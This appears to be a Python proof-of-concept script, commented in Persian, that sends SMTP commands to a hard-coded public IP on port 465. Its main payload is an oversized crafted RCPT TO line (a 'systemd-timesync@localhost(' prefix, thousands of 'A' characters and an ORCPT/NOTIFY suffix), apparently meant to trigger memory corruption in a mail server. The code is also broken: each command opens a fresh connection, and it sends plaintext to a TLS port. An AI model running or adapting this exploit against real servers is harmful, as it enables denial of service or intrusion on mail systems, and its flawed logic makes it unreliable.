import socket
import time

# تنظیمات IP و پورت
ip_address = '185.32.188.114'
port = 465

# تابع برای ارسال دستورات SMTP
def send_smtp_command(command):
    with socket.create_connection((ip_address, port)) as sock:
        sock.sendall(command.encode() + b'\r\n')
        time.sleep(1)
        response = sock.recv(4096)
        print(response.decode())

# شروع تست
try:
    print("Sending EHLO...")
    send_smtp_command('EHLO test')

    print("Sending MAIL FROM...")
    send_smtp_command('MAIL FROM:<example@example.com>')

    print("Sending long ORCPT...")
    long_orcpt = 'RCPT TO:<"systemd-timesync@localhost("; ' + 'A' * (16384 - 74) + 'xxx1048576,-1#1 NOTIFY=DELAY'
    send_smtp_command(long_orcpt)

    print("Sending DATA...")
    send_smtp_command('DATA')
    send_smtp_command('.')
except Exception as e:
    print(f"Error: {e}")
